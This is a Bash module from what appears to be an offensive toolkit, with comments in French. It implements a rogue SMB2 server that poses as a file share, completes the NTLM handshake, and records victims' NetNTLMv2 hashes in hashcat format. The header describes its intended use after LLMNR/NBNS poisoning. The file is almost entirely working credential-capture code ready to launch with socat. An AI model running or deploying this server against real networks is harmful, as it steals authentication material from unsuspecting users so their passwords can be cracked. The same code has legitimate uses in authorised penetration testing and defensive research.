#!/usr/bin/env bash
#
# lib/server/smb/ntlm.sh - SMB2 minimal capture server (NTLM)
#
# Serveur SMB2 oriente capture : negocie SMB2 + SessionSetup NTLM Type 1/2/3,
# extrait le NetNTLMv2 et le sort en format hashcat (mode 5600).
#
# Flux offensif :
#   LLMNR/NBNS poisoning -> victime se connecte -> hash capture
#
# API publique :
#   smb::server::start    <bind_ip> [port] [challenge_hex] [callback_cmd]
#   smb::server::stop
#   smb::server::build_challenge      <var_out> <challenge_hex> [nb_domain] [nb_computer]
#   smb::server::capture_negotiate    <smb2_hex> <var_dict_out>
#   smb::server::capture_authenticate <smb2_hex> <var_dict_out>
#   smb::server::format_hashcat_ntlmv2 <dict_name> <challenge_hex>
#
# Dependances : core/endian, core/log, core/hex, encoding/utf16,
#               protocol/smb/smb2/header, protocol/smb/spnego,
#               protocol/ntlm/flags, protocol/ntlm/challenge,
#               protocol/ntlm/authenticate
#
# ─────────────────────────────────────────────────────────────────────────────

[[ -n "${_BK_SERVER_SMB_NTLM:-}" ]] && return 0
readonly _BK_SERVER_SMB_NTLM=1

bk::import core/endian
bk::import core/log
bk::import core/hex
bk::import encoding/utf16
bk::import protocol/smb/smb2/header
bk::import protocol/smb/spnego
bk::import protocol/ntlm/flags
bk::import protocol/ntlm/challenge
bk::import protocol/ntlm/authenticate

# ── Constantes ────────────────────────────────────────────────────────────────

readonly SMB_SRV_DEFAULT_PORT=445
readonly SMB_SRV_DEFAULT_CHALLENGE="1122334455667788"

# ── Etat serveur ─────────────────────────────────────────────────────────────

_SMB_SRV_PID=""
_SMB_SRV_HANDLER=""
_SMB_SRV_CAPTURE_LOG=""

# ── API publique : build / parse / format ─────────────────────────────────────

# smb::server::build_challenge <var_out> <challenge_hex>
#                              [nb_domain] [nb_computer] [dns_domain] [dns_computer]
#
# Construit le SecurityBuffer du SMB2 SESSION_SETUP Response (challenge) :
# NTLM Type 2 encapsule dans SPNEGO NegTokenResp.
smb::server::build_challenge() {
    local -n _sbc_out="$1"
    local challenge="${2^^}"
    local nb_domain="${3:-WORKGROUP}"
    local nb_computer="${4:-SERVER}"
    local dns_domain="${5:-workgroup.local}"
    local dns_computer="${6:-server.workgroup.local}"

    # MsvAvDnsComputerName (AvId=3) est obligatoire : impacket et Windows le
    # lisent pour construire le SPN cifs/<hostname> dans computeResponseNTLMv2.
    local ntlm_chall
    ntlm::challenge::build ntlm_chall "${challenge}" \
        "${nb_domain}" "${nb_domain}" "${nb_computer}" \
        "${dns_domain}" "${dns_computer}"

    spnego::ntlm_challenge "${ntlm_chall}" _sbc_out
}

# smb::server::capture_negotiate <smb2_hex> <var_dict_out>
#
# Extrait le NTLM Negotiate (Type 1) depuis un SMB2 SESSION_SETUP Request.
# Remplit : msg_id, session_id, ntlm_negotiate
smb::server::capture_negotiate() {
    local msg="${1^^}"
    local -n _scn_dict="$2"

    # SMB2 header
    local -A _hdr
    smb2::header::parse "${msg}" _hdr || return 1
    _scn_dict[msg_id]="${_hdr[msg_id]}"
    _scn_dict[session_id]="${_hdr[session_id]}"

    # SecurityBuffer : offset 68, len 70 (dans le corps SESSION_SETUP = apres les 64B header)
    # Corps : StructureSize(2)+Flags(1)+SecurityMode(1)+Capabilities(4)+Channel(4)
    #         +SecBufOff(2)+SecBufLen(2)+PreviousSessId(8) = 24B -> SecBuf a offset 88
    # SESSION_SETUP Request : SecBufOffset=76, SecBufLen=78
    # (different de la Response : 68/70)
    local -i sec_off sec_len
    endian::read_le16 "${msg}" 76 sec_off
    endian::read_le16 "${msg}" 78 sec_len

    local spnego_blob
    hex::slice "${msg}" "${sec_off}" "${sec_len}" spnego_blob

    local ntlm
    spnego::find_ntlm "${spnego_blob}" ntlm || return 1
    _scn_dict[ntlm_negotiate]="${ntlm}"
}

# smb::server::capture_authenticate <smb2_hex> <var_dict_out>
#
# Extrait le NTLM Authenticate (Type 3) depuis un SMB2 SESSION_SETUP Request.
# Remplit : msg_id, session_id, username, domain, workstation,
#           nt_proof, nt_blob, nt_response, lm_response
smb::server::capture_authenticate() {
    local msg="${1^^}"
    local -n _sca_dict="$2"

    local -A _hdr
    smb2::header::parse "${msg}" _hdr || return 1
    _sca_dict[msg_id]="${_hdr[msg_id]}"
    _sca_dict[session_id]="${_hdr[session_id]}"

    # SESSION_SETUP Request : SecBufOffset=76, SecBufLen=78
    local -i sec_off sec_len
    endian::read_le16 "${msg}" 76 sec_off
    endian::read_le16 "${msg}" 78 sec_len

    local spnego_blob ntlm
    hex::slice "${msg}" "${sec_off}" "${sec_len}" spnego_blob
    spnego::find_ntlm "${spnego_blob}" ntlm || return 1

    local -A _auth
    ntlm::authenticate::parse "${ntlm}" _auth || return 1

    # Decoder UTF-16LE -> ASCII
    local user domain workstation
    utf16::decode_le "${_auth[username]}"    user
    utf16::decode_le "${_auth[domain]}"      domain
    utf16::decode_le "${_auth[workstation]}" workstation

    _sca_dict[username]="${user}"
    _sca_dict[domain]="${domain}"
    _sca_dict[workstation]="${workstation}"
    _sca_dict[nt_proof]="${_auth[nt_proof]}"
    _sca_dict[nt_blob]="${_auth[nt_blob]}"
    _sca_dict[nt_response]="${_auth[nt_response]}"
    _sca_dict[lm_response]="${_auth[lm_response]}"
}

# smb::server::format_hashcat_ntlmv2 <dict_name> <challenge_hex>
#
# Formate une capture en NetNTLMv2 hashcat (mode 5600) :
#   username::domain:challenge:nt_proof:blob
smb::server::format_hashcat_ntlmv2() {
    local -n _sfh_dict="$1"
    local challenge="${2^^}"

    printf '%s::%s:%s:%s:%s\n' \
        "${_sfh_dict[username]}" \
        "${_sfh_dict[domain]}" \
        "${challenge}" \
        "${_sfh_dict[nt_proof]}" \
        "${_sfh_dict[nt_blob]}"
}

# ── Helpers internes de construction SMB2 ─────────────────────────────────────

# _smb_srv_neg_response <msg_id_int> <var_out_hex>
#
# Construit un SMB2 NEGOTIATE Response minimal (dialect 0x0202).
_smb_srv_neg_response() {
    local -i msg_id="$1"
    local -n _ssnr_out="$2"

    # SPNEGO NegTokenInit (mechTypes=[NTLMSSP])
    local spnego_blob
    spnego::server_ntlm_init spnego_blob
    local -i spnego_len=$(( ${#spnego_blob} / 2 ))

    # Header : flags = SERVER_TO_REDIR, status = SUCCESS
    local hdr
    smb2::header::build hdr \
        "${SMB2_CMD_NEGOTIATE}" "${msg_id}" \
        "0000000000000000" 0 \
        "${SMB2_STATUS_SUCCESS}" \
        "${SMB2_FLAGS_SERVER_TO_REDIR}" \
        1 0

    # ServerGuid aleatoire (16 octets)
    local srv_guid
    printf -v srv_guid '%04X%04X%04X%04X%04X%04X%04X%04X' \
        "${RANDOM}" "${RANDOM}" "${RANDOM}" "${RANDOM}" \
        "${RANDOM}" "${RANDOM}" "${RANDOM}" "${RANDOM}"

    # SecurityBufferOffset = 128 (64 header + 64 body fixe)
    local _le spnego_len_le spnego_off_le
    endian::le16 "${spnego_len}" spnego_len_le
    endian::le16 128 spnego_off_le

    local body="4100"               # StructureSize = 65
    body+="0100"                    # SecurityMode = SIGNING_ENABLED
    body+="0202"                    # DialectRevision = 2.0.2
    body+="0000"                    # NegotiateContextCount = 0
    body+="${srv_guid}"             # ServerGuid (16B)
    endian::le32 5 _le; body+="${_le}"               # Capabilities = DFS|LARGE_MTU
    endian::le32 0x800000 _le; body+="${_le}"        # MaxTransactSize
    endian::le32 0x800000 _le; body+="${_le}"        # MaxReadSize
    endian::le32 0x800000 _le; body+="${_le}"        # MaxWriteSize
    body+="0000000000000000"        # SystemTime = 0
    body+="0000000000000000"        # ServerStartTime = 0
    body+="${spnego_off_le}"        # SecurityBufferOffset
    body+="${spnego_len_le}"        # SecurityBufferLength
    body+="00000000"               # NegotiateContextOffset = 0
    body+="${spnego_blob}"          # SecurityBuffer

    _ssnr_out="${hdr}${body}"
}

# _smb_srv_ss_challenge <msg_id_int> <session_id_hex16> <spnego_blob_hex> <var_out_hex>
#
# Construit un SMB2 SESSION_SETUP Response (challenge) :
# status = MORE_PROCESSING_REQUIRED.
_smb_srv_ss_challenge() {
    local -i msg_id="$1"
    local session_id="$2"
    local spnego_blob="${3^^}"
    local -n _sssc_out="$4"

    local -i spnego_len=$(( ${#spnego_blob} / 2 ))
    local _le spnego_len_le

    # SecurityBufferOffset = 72 (64 header + 8 corps fixe)
    local spnego_off_le; endian::le16 72 spnego_off_le
    endian::le16 "${spnego_len}" spnego_len_le

    local hdr
    smb2::header::build hdr \
        "${SMB2_CMD_SESSION_SETUP}" "${msg_id}" \
        "${session_id}" 0 \
        "${SMB2_STATUS_MORE_PROCESSING}" \
        "${SMB2_FLAGS_SERVER_TO_REDIR}" \
        1 1

    local body="0900"               # StructureSize = 9
    body+="0000"                    # SessionFlags = 0
    body+="${spnego_off_le}"        # SecurityBufferOffset
    body+="${spnego_len_le}"        # SecurityBufferLength
    body+="${spnego_blob}"          # SecurityBuffer

    _sssc_out="${hdr}${body}"
}

# _smb_srv_ss_error <msg_id_int> <session_id_hex16> <status_int> <var_out_hex>
#
# Construit un SMB2 SESSION_SETUP Response d'erreur (ex: ACCESS_DENIED).
_smb_srv_ss_error() {
    local -i msg_id="$1"
    local session_id="$2"
    local -i status="$3"
    local -n _ssse_out="$4"

    local hdr
    smb2::header::build hdr \
        "${SMB2_CMD_SESSION_SETUP}" "${msg_id}" \
        "${session_id}" 0 \
        "${status}" \
        "${SMB2_FLAGS_SERVER_TO_REDIR}" \
        1 1

    # Corps minimal : StructureSize=9 + SessionFlags=0 + no SecurityBuffer
    local _le; endian::le16 0 _le
    local body="0900${_le}00480000"  # SS=9, Flags=0, Offset=72, Len=0
    _ssse_out="${hdr}${body}"
}

# ── Serveur socat ─────────────────────────────────────────────────────────────

# smb::server::start <bind_ip> [port] [challenge_hex] [callback_cmd]
#
# Lance un listener SMB2 capture NTLM via socat.
# <callback_cmd> : commande appelee avec <user> <domain> <hash_hashcat> a chaque capture.
# Les captures sont aussi loggees dans /tmp/smb_capture_*.log
smb::server::start() {
    local bind_ip="$1"
    local -i port="${2:-${SMB_SRV_DEFAULT_PORT}}"
    local challenge="${3:-${SMB_SRV_DEFAULT_CHALLENGE}}"
    local callback_cmd="${4:-}"

    challenge="${challenge^^}"

    if ! command -v socat &>/dev/null; then
        log::error "smb::server : socat introuvable"
        return 1
    fi

    local bk_root
    bk_root="$(cd "$(dirname "${BASH_SOURCE[0]}")/../../.." && pwd)"

    local capture_log
    capture_log="$(mktemp /tmp/smb_capture_XXXXXX.log)"
    _SMB_SRV_CAPTURE_LOG="${capture_log}"

    local handler
    handler="$(mktemp /tmp/smb_handler_XXXXXX.sh)"
    _SMB_SRV_HANDLER="${handler}"

    # En-tete dynamique (variables expandees)
    cat > "${handler}" <<HEADER
#!/usr/bin/env bash
set -uo pipefail
_bk_root="${bk_root}"
_challenge="${challenge}"
_capture_log="${capture_log}"
_callback_cmd="${callback_cmd}"
_session_id="0100000000000000"
HEADER

    # Corps statique (pas d'expansion - tout est dans les variables ci-dessus)
    cat >> "${handler}" << 'BODY'

source "${_bk_root}/bashket.sh"
bk::import core/endian
bk::import core/hex
bk::import encoding/utf16
bk::import protocol/smb/smb2/header
bk::import protocol/smb/spnego
bk::import protocol/ntlm/flags
bk::import protocol/ntlm/challenge
bk::import protocol/ntlm/authenticate
bk::import server/smb/ntlm

# Lire un message NBT+SMB2 depuis stdin (binaire)
# dd bs=1 count=N : lecture sequentielle exacte sans sur-buffering.
# od -v : desactive la compression "*" des lignes identiques (sinon le hex
#         est tronque silencieusement pour les donnees repetitives).
_read_smb() {
    local nbt
    nbt=$(dd bs=1 count=4 2>/dev/null | od -An -tx1 -v | tr -d ' \n' | tr 'a-f' 'A-F')
    [[ ${#nbt} -eq 8 ]] || return 1
    local -i n=$(( 16#${nbt:2:6} ))
    [[ $n -gt 0 && $n -lt 1048576 ]] || return 1
    local body
    body=$(dd bs=1 count="${n}" 2>/dev/null | od -An -tx1 -v | tr -d ' \n' | tr 'a-f' 'A-F')
    [[ ${#body} -eq $(( n * 2 )) ]] || return 1
    printf '%s' "${body}"
}

# Ecrire un message NBT+SMB2 vers stdout (binaire)
# Tout passer par xxd -r -p pour eviter le \x%02x invalide en printf.
_write_smb() {
    local hex="${1^^}"
    local -i plen=$(( ${#hex} / 2 ))
    local nbt_hex; printf -v nbt_hex '00%06X' "${plen}"
    printf '%s' "${nbt_hex}${hex}" | xxd -r -p
}

# -- Etape 1 : NEGOTIATE -------------------------------------------------------

raw=$(_read_smb) || exit 0
[[ -n "${raw}" ]] || exit 0

# MessageId depuis l'en-tete SMB2 (offset 24, 4B LE)
declare -i _mid=0
endian::read_le32 "${raw}" 24 _mid

declare _neg_resp
_smb_srv_neg_response "${_mid}" _neg_resp
_write_smb "${_neg_resp}"

# -- Etape 2 : SESSION_SETUP #1 (NTLM Negotiate) ------------------------------

raw=$(_read_smb) || exit 0
[[ -n "${raw}" ]] || exit 0

endian::read_le32 "${raw}" 24 _mid

# Construire le challenge NTLM Type 2 encapsule dans SPNEGO
declare _spnego_chall
smb::server::build_challenge _spnego_chall "${_challenge}"

declare _ss_chall_resp
_smb_srv_ss_challenge "${_mid}" "${_session_id}" "${_spnego_chall}" _ss_chall_resp
_write_smb "${_ss_chall_resp}"

# -- Etape 3 : SESSION_SETUP #2 (NTLM Authenticate) ---------------------------

raw=$(_read_smb) || exit 0
[[ -n "${raw}" ]] || exit 0

endian::read_le32 "${raw}" 24 _mid

declare -A _auth_dict
if smb::server::capture_authenticate "${raw}" _auth_dict; then
    declare _hash
    _hash=$(smb::server::format_hashcat_ntlmv2 _auth_dict "${_challenge}")

    # Log dans le fichier de capture
    printf '%s\n' "${_hash}" >> "${_capture_log}"

    # Afficher sur stderr (visible dans le terminal qui a lance le serveur)
    printf '[+] %s\\%s depuis %s\n' \
        "${_auth_dict[domain]}" \
        "${_auth_dict[username]}" \
        "${SOCAT_PEERADDR:-?}" >&2
    printf '    %s\n' "${_hash}" >&2

    # Callback optionnel
    if [[ -n "${_callback_cmd}" ]]; then
        ${_callback_cmd} \
            "${_auth_dict[username]}" \
            "${_auth_dict[domain]}" \
            "${_hash}" \
            "${SOCAT_PEERADDR:-}" &>/dev/null &
    fi
fi

# Repondre ACCESS_DENIED (on ne veut pas accorder l'acces, juste capturer)
declare _ss_err
_smb_srv_ss_error "${_mid}" "${_session_id}" "${SMB2_STATUS_ACCESS_DENIED}" _ss_err
_write_smb "${_ss_err}"

exit 0
BODY

    chmod +x "${handler}"

    socat "TCP4-LISTEN:${port},bind=${bind_ip},reuseaddr,fork" \
        "EXEC:bash ${handler}" >/dev/null 2>&1 &
    local -i pid=$!
    _SMB_SRV_PID="${pid}"

    sleep 0.3
    if ! kill -0 "${pid}" 2>/dev/null; then
        wait "${pid}" 2>/dev/null || true
        rm -f "${handler}" "${capture_log}"
        _SMB_SRV_PID="" ; _SMB_SRV_HANDLER="" ; _SMB_SRV_CAPTURE_LOG=""
        log::error "smb::server : echec du demarrage (port ${port} accessible ?)"
        return 1
    fi

    log::info "smb::server : listener demarre ${bind_ip}:${port} challenge=${challenge} (pid=${pid})"
    log::info "smb::server : captures -> ${capture_log}"
}

# smb::server::stop
#
# Arrete le listener SMB.
smb::server::stop() {
    [[ -z "${_SMB_SRV_PID:-}" ]] && return 0
    kill "${_SMB_SRV_PID}" 2>/dev/null || true
    wait "${_SMB_SRV_PID}" 2>/dev/null || true
    log::debug "smb::server : arrete (pid=${_SMB_SRV_PID})"
    [[ -n "${_SMB_SRV_HANDLER:-}"     ]] && rm -f "${_SMB_SRV_HANDLER}"
    _SMB_SRV_PID="" ; _SMB_SRV_HANDLER="" ; _SMB_SRV_CAPTURE_LOG=""
}
